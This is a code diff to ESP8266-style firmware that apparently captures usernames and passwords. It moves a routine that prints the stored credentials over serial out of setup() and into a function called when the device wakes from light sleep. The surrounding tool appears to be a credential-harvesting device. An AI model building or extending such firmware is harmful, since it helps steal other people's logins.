@@ -372,6 +372,18 @@ static void ICACHE_FLASH_ATTR screenTimeout( long timeout ){
     }
   }
 }
+static void ICACHE_FLASH_ATTR dumpCredentials( void ){
+  Serial.println();
+  Serial.println("Recovered credentials:");
+  int i = 0;
+  while(previousCaptures == 0 ){
+    loadCredentials(i);
+    Serial.println(capturedCredentials[i].username);
+    Serial.println(capturedCredentials[i].password);
+    Serial.println();
+    i++;
+  }
+}
 
 /*=====================================================
   End of Screen states
@@ -441,16 +453,6 @@ void setup() {
 
     clearEEPROM(); //uncomment to clear stored credentials
 
-    Serial.println();
-    Serial.println("Recovered credentials:");
-    int i = 0;
-    while(previousCaptures == 0 ){
-      loadCredentials(i);
-      Serial.println(capturedCredentials[i].username);
-      Serial.println(capturedCredentials[i].password);
-      Serial.println();
-      i++;
-    }
 }
 
 
@@ -503,7 +505,7 @@ void loop() {
   // Clear screen and enter deep sleep
   if(screenState == 5){
       //ESP.deepSleep(0);
-      //WiFi.mode(WIFI_STA);
+      //Enter light sleep mode
       wifi_station_disconnect();
       wifi_set_opmode(NULL_MODE);          // set WiFi mode to null mode.
       wifi_fpm_set_sleep_type(LIGHT_SLEEP_T);      // light sleep
@@ -516,7 +518,9 @@ void loop() {
           Serial.println("escape");
           timeOfLastModeSwitch = millis();
           screenState=0;
-          //ESP.reset();
+
+          dumpCredentials();
+
         }
         delay(100);
       }
